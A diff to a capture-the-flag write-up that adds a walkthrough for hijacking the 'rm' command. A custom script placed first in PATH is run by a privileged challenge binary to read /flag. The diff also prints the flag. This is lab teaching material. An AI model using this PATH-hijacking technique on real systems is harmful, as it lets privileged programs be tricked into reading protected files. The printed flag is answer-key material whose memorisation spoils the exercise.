@@ -135,7 +135,7 @@ If you want to avoid relying on the `cat` command altogether, you can use the bu
    ```bash
    export PATH=$PATH:./
    ```
-   This command appends the current directory (`./`) to the existing `PATH`, allowing the shell to find your `win` script.
+   This command appends the current directory (`./`) to the existing `PATH`, allowing the shell to find your `win` scripts or executables.
 
 4. **Execute the Challenge**:
    ```bash
@@ -152,7 +152,7 @@ If you want to avoid relying on the `cat` command altogether, you can use the bu
    ```bash
    export PATH=$PATH:./
    ```
-   This command adds the current directory to the `PATH`, allowing your shell to find the `win` script.
+   This command adds the current directory to the `PATH`, allowing your shell to find the `win` script or executables.
 
 2. **Create the `win` Script**:
    ```bash
@@ -180,7 +180,7 @@ If you want to avoid relying on the `cat` command altogether, you can use the bu
    ```bash
    export PATH=$PATH:./
    ```
-   Again, this command adds the current directory to the `PATH`, allowing your shell to find the `win` script.
+   Again, this command adds the current directory to the `PATH`, allowing your shell to find the `win` script or executables.
 
 3. **Execute the Challenge**:
    ```bash
@@ -213,5 +213,64 @@ Third Method.
 
 ---
 
+## Hijacking Commands.
+
+### Description
+In this challenge, the goal is to prevent the deletion of a flag file by hijacking the `rm` command. By overriding the default `rm` command, we can manipulate its behavior to execute alternative commands instead.
+
+### Info / Stuff We Should Know
+- The `rm` command is used to delete files in Unix-like operating systems.
+- The system searches for the `rm` executable in the directories listed in the `PATH` environment variable.
+- By creating a custom `rm` command in a directory that is prioritized in the `PATH`, we can control its behavior.
+
+### Step-by-Step Solution
+
+**Step 1: Create a Custom `rm` Command**
+- First, create a custom `rm` script that does nothing when called. This prevents the original `rm` command from executing.
+```bash
+echo -e '#!/bin/bash\n# Custom rm command to do nothing\nexit 0' > rm
+```
+
+**Step 2: Update the PATH**
+- Update the `PATH` environment variable to ensure our custom `rm` command is found first. 
+- By using `export PATH=~/:$PATH`, we add the current user's home directory (`~`) at the beginning of the `PATH`. This ensures that when the system searches for the `rm` command, it finds our custom script first, rather than the default `rm` command located elsewhere in the system.
+```bash
+export PATH=~/:$PATH
+```
+
+**Step 3: Run the Challenge Command**
+- Execute the challenge command, which attempts to call the `rm` command to delete the flag.
+```bash
+/challenge/run
+```
+**Output**: 
+```
+Trying to remove /flag...
+Found 'rm' command at /home/hacker//rm. Executing!
+```
+- The output shows that our custom `rm` command was executed, doing nothing and preventing the flag from being deleted.
+
+**Step 4: Modify the Custom `rm` Command to Reveal the Flag**
+- Modify the `rm` command to execute a command that displays the flag when it is called.
+```bash
+echo "cat /flag" > rm
+```
+
+**Step 5: Run the Challenge Command Again**
+- Execute the challenge command again, which now calls our modified `rm` script.
+```bash
+/challenge/run
+```
+
+This now returns the flag.
+
+### Flag
+
+> 833r9LTabEHXWchnzliZdV6H03z.ddzNyUDL4czN0czW
+
+![image](https://github.com/user-attachments/assets/3bf0615f-77c0-4f7a-8035-5db14f20f317)
+
+Quite literally hijacked the command to do what we want :D
+---
 
 
